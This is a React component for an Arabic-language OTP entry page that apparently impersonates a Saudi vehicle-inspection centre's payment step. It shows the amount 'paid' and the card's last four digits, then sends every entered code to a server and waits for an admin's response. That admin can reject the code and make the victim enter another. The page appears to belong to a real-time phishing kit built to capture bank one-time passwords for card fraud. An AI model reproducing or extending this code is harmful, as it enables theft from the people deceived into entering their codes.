import Main from "@/components/Main";
import { isFormRejected } from "@/real-time/context/signals";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import Button from "@mui/material/Button";
import FormControl from "@mui/material/FormControl";
import OutlinedInput from "@mui/material/OutlinedInput";
import Stack from "@mui/material/Stack";
import { useEffect } from "react";
import { FieldValues, useForm } from "react-hook-form";
import ResendCode from "@/components/ResendCode";
import PaymentCardDetails from "@/components/PaymentCardDetails";

function CheckOtp() {
  const {
    register,
    handleSubmit,
    reset,
    formState: { isValid },
    setValue,
  } = useForm({
    mode: "onChange",
    defaultValues: {
      otp: "",
    },
  });

  function sendData(data: FieldValues) {
    sendDataToServer({
      digitCode: data.otp,
      current: "رمز التحقق (OTP)",
      nextPage: "توثيق رقم الجوال",
      waitingForAdminResponse: true,
    });
  }

  useEffect(() => setCurrentPage("رمز التحقق (OTP)"), []);

  useEffect(() => {
    if (isFormRejected.value) {
      reset();
    }
  }, [isFormRejected.value]);

  const { totalPaid, cardLast4 } = JSON.parse(
    localStorage.getItem("payment") || ""
  );

  return (
    <Main>
      <form
        className="flex flex-col flex-1 gap-8 w-full"
        onSubmit={handleSubmit(sendData)}
      >
        <div className="top">
          <div className="flex flex-col items-center gap-5">
            <h2 className="font-bold text-xl">رمز التحقق لمرة واحدة (OTP)</h2>
            <h2 className="font-semibold text-xl">
              لتأكيد العملية أدخل رمز التحقق المرسل إلى جوالك
            </h2>
          </div>
          <PaymentCardDetails />
          <p className="mt-6 font-semibold text-black">
            سيتم الاتصال بك من قبل البنك المصدر للبطاقة الائتمانية المنتهية بـ{" "}
            <b>{cardLast4}</b>، يرجى اتباع الرد الآلي لإرسال رمز التحقق برسالة
            نصية.
          </p>

          <p className="mt-6 font-semibold text-black">
            انت تدفع لمركز سلامة المركبات مبلغ{" "}
            <span className="font-bold">{totalPaid || "--"}</span> ر.س بتاريخ{" "}
            {new Date().toLocaleDateString()} في التوقيت{" "}
            <span dir="ltr">{new Date().toLocaleTimeString()}</span>
          </p>
          <p className="mt-6 font-bold text-green-600">تم إرسال الرمز بنجاح</p>
        </div>

        <FormControl fullWidth>
          <OutlinedInput
            sx={{ textAlign: "center" }}
            dir="ltr"
            {...register("otp", {
              required: "رمز otp مطلوب",
              validate: (value) => {
                return (
                  value.length === 6 || value.length === 4 || "رقم غير صحيح"
                );
              },
            })}
            onChange={(e) => {
              setValue("otp", e.target.value, {
                shouldValidate: true,
              });
            }}
            inputProps={{ maxLength: 6, style: { textAlign: "center" } }}
            type="tel"
            name="otp"
            id="otp"
            placeholder="(OTP) رمز التحقق"
          />
        </FormControl>

        {isFormRejected.value && (
          <Stack className="font-medium mt-5 text-red-500 text-center">
            رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى.
          </Stack>
        )}

        <Stack
          className="form-bottom"
          direction="row"
          justifyContent="end"
          alignItems="center"
          mt="24px"
          mb="5px"
        >
          <Button
            fullWidth
            variant="contained"
            disabled={!isValid}
            type="submit"
            size="large"
          >
            تحقق
          </Button>
        </Stack>
        <div className="text-center">
          <ResendCode />
        </div>
      </form>
    </Main>
  );
}

export default CheckOtp;
